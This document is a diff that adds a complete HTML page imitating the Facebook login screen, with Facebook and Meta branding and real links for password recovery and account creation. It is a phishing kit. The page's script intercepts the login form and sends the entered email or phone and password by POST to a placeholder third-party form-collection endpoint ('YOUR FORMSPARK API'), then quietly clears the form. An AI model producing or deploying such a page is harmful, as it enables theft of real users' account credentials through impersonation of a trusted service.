@@ -1,0 +1,509 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook Log in</title>
+  <style>
+    :root {
+      color-scheme: light;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #1c1e21;
+      background: #fff;
+      font-synthesis: none;
+      text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+      --blue: #0866ff;
+      --border: #dadde1;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-width: 320px;
+      min-height: 100vh;
+    }
+
+    .page {
+      display: flex;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .main {
+      display: grid;
+      flex: 1 0 auto;
+      grid-template-columns: 56% 44%;
+      min-height: calc(100vh - 50px);
+    }
+
+    .promo {
+      position: relative;
+      overflow: hidden;
+      min-height: 660px;
+      border-right: 2px solid #e4e6eb;
+    }
+
+    .facebook-mark {
+      position: absolute;
+      z-index: 3;
+      top: 24px;
+      left: 26px;
+      display: grid;
+      width: 59px;
+      height: 59px;
+      place-items: center;
+      overflow: hidden;
+      border-radius: 50%;
+      background: #0866ff;
+    }
+
+    .facebook-mark svg {
+      width: 59px;
+      height: 59px;
+    }
+
+    .tagline {
+      position: absolute;
+      z-index: 2;
+      bottom: 45px;
+      left: 20px;
+      width: 270px;
+      margin: 0;
+      font-size: clamp(42px, 4.1vw, 61px);
+      font-weight: 750;
+      letter-spacing: -3.2px;
+      line-height: 1.04;
+    }
+
+    .tagline span {
+      color: var(--blue);
+      white-space: nowrap;
+    }
+
+    .artwork {
+      position: absolute;
+      top: 50%;
+      left: 32%;
+      display: block;
+      width: min(64%, 520px);
+      height: auto;
+      transform: translateY(-50%);
+    }
+
+    .login-panel {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 0;
+      padding: 48px;
+    }
+
+    .login-content {
+      width: min(100%, 531px);
+      transform: translateY(-1px);
+    }
+
+    .login-heading {
+      display: flex;
+      align-items: center;
+      gap: 25px;
+      margin: 0 0 37px 13px;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .back-arrow {
+      width: 13px;
+      height: 13px;
+      border-bottom: 2px solid #1c1e21;
+      border-left: 2px solid #1c1e21;
+      transform: rotate(45deg);
+    }
+
+    .fields {
+      display: grid;
+      gap: 11px;
+    }
+
+    .field {
+      width: 100%;
+      height: 59px;
+      padding: 0 16px;
+      border: 1px solid #dadde1;
+      border-radius: 17px;
+      outline: none;
+      color: #1c1e21;
+      background: #fff;
+      font: inherit;
+      font-size: 15px;
+      opacity: 1;
+      -webkit-text-fill-color: #1c1e21;
+    }
+
+    .field:focus {
+      border-color: #0866ff;
+      box-shadow: 0 0 0 3px rgba(8, 102, 255, 0.12);
+    }
+
+    .form-status {
+      color: #d93025;
+      font-size: 13px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .form-status:not(:empty) {
+      min-height: 20px;
+      margin-top: 18px;
+    }
+
+    .form-status.success {
+      color: #1877f2;
+    }
+
+    .login-button,
+    .create-button {
+      display: grid;
+      width: 100%;
+      height: 44px;
+      place-items: center;
+      border: 0;
+      border-radius: 24px;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .login-button {
+      margin-top: 23px;
+      color: #fff;
+      background: #0866e9;
+    }
+
+    .forgot-link {
+      display: grid;
+      margin-top: 23px;
+      color: #111;
+      font-size: 14px;
+      font-weight: 60px;
+      text-align: center;
+      text-decoration: none;
+      
+    }
+
+    .create-button {
+      height: 43px;
+      margin-top: 64px;
+      border: 1px solid #0866ff;
+      color: #0866ff;
+      background: #fff;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .meta-mark {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      margin-top: 10px;
+      color: #344854;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    .meta-mark svg {
+      width: 20px;
+      height: 14px;
+    }
+
+    .footer {
+      display: flex;
+      min-height: 51px;
+      align-items: center;
+      justify-content: center;
+      border-top: 1px solid #dadde1;
+      color: #737373;
+    }
+
+    .languages {
+      display: flex;
+      width: min(1076px, calc(100% - 48px));
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;
+      overflow: hidden;
+      white-space: nowrap;
+      font-size: 14px;
+    }
+
+    .languages a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    @media (max-width: 900px) {
+      .main {
+        grid-template-columns: 1fr;
+      }
+
+      .promo {
+        display: none;
+      }
+
+      .login-panel {
+        min-height: calc(100vh - 51px);
+        padding: 40px 24px;
+      }
+
+      .login-content {
+        width: min(100%, 531px);
+      }
+
+      .languages {
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 8px 18px;
+        padding: 12px 0;
+        white-space: normal;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-panel {
+        align-items: flex-start;
+        padding: 60px 20px 35px;
+      }
+
+      .login-heading {
+        margin-bottom: 30px;
+      }
+
+      .create-button {
+        margin-top: 54px;
+      }
+
+      .footer {
+        min-height: 68px;
+      }
+
+      .languages {
+        font-size: 12px;
+      }
+    }
+
+
+   /* Empty input error */
+.field.input-error {
+    border: 1px solid #f02849 !important;
+    background-color: #fff8f8;
+    box-shadow: 0 0 0 1px rgba(240, 40, 73, 0.08);
+}
+
+/* Error message */
+.form-status.error {
+    display: block;
+    color: #f02849;
+    font-size: 13px;
+    text-align: left;
+    margin-top: 8px;
+    line-height: 1.4;
+    font-weight: 400;
+}
+
+/* Error icon */
+.error-icon {
+    display: inline-block;
+    margin-right: 5px;
+    font-weight: bold;
+    font-size: 15px;
+}
+
+
+.floating-field {
+    position: relative;
+    width: 100%;
+    margin-bottom: 12px;
+}
+
+.floating-field input {
+    width: 100%;
+    height: 60px;
+    padding: 22px 12px 8px;
+    border: 1px solid #ccd0d5;
+    border-radius: 8px;
+    outline: none;
+    font-size: 16px;
+    box-sizing: border-box;
+    background: white;
+}
+
+.floating-field label {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 16px;
+    color: #606770;
+    pointer-events: none;
+    transition: all 0.2s ease;
+}
+
+.floating-field input:focus {
+    border-color: #1877f2;
+}
+
+.floating-field input:focus + label,
+.floating-field input:not(:placeholder-shown) + label {
+    top: 12px;
+    transform: translateY(0);
+    font-size: 12px;
+    color: #606770;
+}
+
+  
+
+  </style>
+</head>
+<body>
+  <div class="page">
+    <main class="main">
+      <section class="promo" aria-label="Facebook discovery">
+        <div class="facebook-mark" aria-label="Facebook">
+          <svg viewBox="0 0 60 60" aria-hidden="true">
+            <path fill="#fff" d="M34.8 60V36.7h7.8l1.2-9.1h-9v-5.8c0-2.6.7-4.4 4.5-4.4H44V9.3c-.8-.1-3.5-.3-6.7-.3-6.6 0-11.1 4-11.1 11.4v7.2h-7.5v9.1h7.5V60z"/>
+          </svg>
+        </div>
+                              
+        <img class="artwork" src="facebook-artwork.png" alt="">
+
+        <h1 class="tagline">Explore<br>the<br>things<br><span>you love.</span></h1>
+      </section>
+
+      <section class="login-panel" aria-label="Log into Facebook">
+
+    <div class="login-content">    
+
+        <h2 class="login-heading">
+            <span class="back-arrow" aria-hidden="true"></span>
+            Log into Facebook
+        </h2>
+
+        <form id="loginForm" >
+
+            <div class="fields">
+
+              
+              <div class="floating-field">
+                <input
+                    id="emailInput"
+                    class="field"
+                    type="text"
+                    name="email_or_phone"
+                    placeholder=" "
+                    autocomplete="off"
+                    required
+                  >
+                  <label for="emailInput">Email or mobile number</label>
+              </div>
+
+                
+               <div class="floating-field">
+                <input
+                    id="passwordInput"
+                    class="field"
+                    type="password"
+                    name="password"
+                    placeholder=" "
+                    autocomplete="off"
+                    required
+                >
+                  <label for="passwordInput">Password</label>
+               </div>
+            </div>
+
+            <button class="login-button" type="submit">
+                Log in
+            </button>
+
+            <a class="forgot-link" 
+            href="https://www.facebook.com/login/identify/" 
+            id="forgotPasswordLink"
+              target="_blank"
+               rel="noopener noreferrer">
+                Forgot password?
+          </a>
+
+            <a
+                class="create-button"
+                href="https://www.facebook.com/reg/?entry_point=login"
+                id="createAccountBtn">
+                Create new account
+        </a>
+
+            <div id="formStatus" class="form-status" aria-live="polite"></div>
+
+        </form>
+
+<div class="meta-mark" aria-label="Meta"> <svg viewBox="0 0 24 16" aria-hidden="true"> <path d="M2 12.7C2 8.2 5.2 2 8.5 2c2.1 0 4.1 3.2 5.8 6.1 1.7 2.8 3.3 5.9 5.1 5.9 1.6 0 2.6-1.6 2.6-3.9C22 6 19.8 2 16.8 2c-2.1 0-4.2 2.8-6 5.9-1.8 3-3.5 6.1-5.4 6.1C3.6 14 2 13.5 2 12.7Z" fill="none" stroke="#0866ff" stroke-width="2.2" stroke-linecap="round"/> </svg> <span>Meta</span> </div>
+</div>
+
+</section>
+    </main>
+
+    <footer class="footer">
+      <nav class="languages" aria-label="Languages">
+        <a href="#">English (US)</a>
+        <a href="#">नेपाली</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">Español</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">日本語</a>
+        <a href="#">Français (France)</a>
+        <a href="#">More languages...</a>
+      </nav>
+    </footer>
+  </div>
+
+ <script>
+document.addEventListener("DOMContentLoaded", () => {
+    const form = document.getElementById("loginForm");
+    const status = document.getElementById("formStatus");
+
+    form.addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        status.textContent = "";
+
+        try {
+      
+      
+            const response = await fetch("YOUR FORMSPARK API", {
+                method: "POST",
+                body: new FormData(form),
+                headers: {
+                    "Accept": "application/json"
+                }
+            });
+
+            if (!response.ok) {
+                throw new Error("");
+            }
+
+            status.textContent = "";
+            form.reset();
+
+        } catch (error) {
+            status.textContent = "";
+        }
+    });
+});
+</script>
+
+</body>
+</html>
